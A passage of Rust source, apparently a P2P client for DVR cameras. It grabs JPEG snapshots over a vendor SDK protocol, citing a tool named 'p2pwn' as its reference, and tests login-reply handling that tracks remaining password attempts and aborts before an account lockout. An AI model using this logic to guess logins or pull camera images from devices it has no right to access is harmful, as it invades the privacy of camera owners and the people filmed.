            Duration::from_millis(50),
            Duration::from_millis(200),
        )
        .await;

        Self::send_realm(sock, session, sdk.realm, &snapshot_cmd(ch)).await;

        let data = p2p::sdk_read_realm(
            sock,
            session,
            sdk.realm,
            // p2pwn reads the snapshot reply in 5 s chunks and only finishes
            // once the JPEG EOI shows up (sdkbin.go, GetSnapshot). A 200 ms
            // window aborts on the pauses DVRs take between encode segments,
            // truncating the frame (7F00CB6PAZ3FC73, 9112-byte JPEG cut at
            // 2205 bytes).
            Duration::from_secs(5),
            Duration::from_secs(60),
        )
        .await;
        self.debug(format!(
            "snapshot_on ch{}: snapshot reply len={:?}",
            channel,
            data.as_ref().map(|d| d.len())
        ))
        .await;

        let mut data = match data {
            Some(d) if d.len() >= 32 => d[32..].to_vec(),
            Some(d) => d,
            None => return None,
        };

        strip_snapshot_garbage(&mut data, ch);

        let soi = data.windows(2).position(|w| w == [0xFF, 0xD8])?;
        data = data[soi..].to_vec();
        if let Some(eoi) = data.windows(2).rposition(|w| w == [0xFF, 0xD9]) {
            data.truncate(eoi + 2);
            return Some(data);
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::{classify_login_response, SdkLoginError};

    fn frame(err: [u8; 2], auth: [u8; 4]) -> Vec<u8> {
        let mut v = vec![0u8; 32];
        v[8] = err[0];
        v[9] = err[1];
        v[28..32].copy_from_slice(&auth);
        v
    }

    #[test]
    fn success_is_error_code_00_08() {
        let f = frame([0x00, 0x08], [0, 0, 0, 0]);
        assert_eq!(classify_login_response(&f), Ok(()));
    }

    #[test]
    fn auth_failed_carries_attempts_left() {
        let f = frame([0x01, 0x00], [0, 0, 0, 5]);
        assert_eq!(
            classify_login_response(&f),
            Err(SdkLoginError::AuthFailed { auth_code: Some(5) })
        );
    }

    #[test]
    fn account_locked_and_username_invalid_abort() {
        let locked = classify_login_response(&frame([0x01, 0x04], [0, 0, 0, 0])).unwrap_err();
        assert_eq!(locked, SdkLoginError::AccountLocked);
        assert!(locked.should_abort());

        let bad_user = classify_login_response(&frame([0x01, 0x01], [0, 0, 0, 0])).unwrap_err();
        assert_eq!(bad_user, SdkLoginError::UsernameInvalid);
        assert!(bad_user.should_abort());
    }

    #[test]
    fn auth_failed_aborts_only_when_attempts_low() {
        let many = SdkLoginError::AuthFailed { auth_code: Some(9) };
        assert!(!many.should_abort());
        let few = SdkLoginError::AuthFailed { auth_code: Some(1) };
        assert!(few.should_abort());
    }

    #[test]
    fn short_frame_and_unknown_codes() {
        assert_eq!(
            classify_login_response(&[0u8; 4]),
            Err(SdkLoginError::NoReply)
        );
        assert_eq!(
            classify_login_response(&frame([0x03, 0x03], [0, 0, 0, 0])),
            Err(SdkLoginError::Other(0x03, 0x03))
        );
    }
}
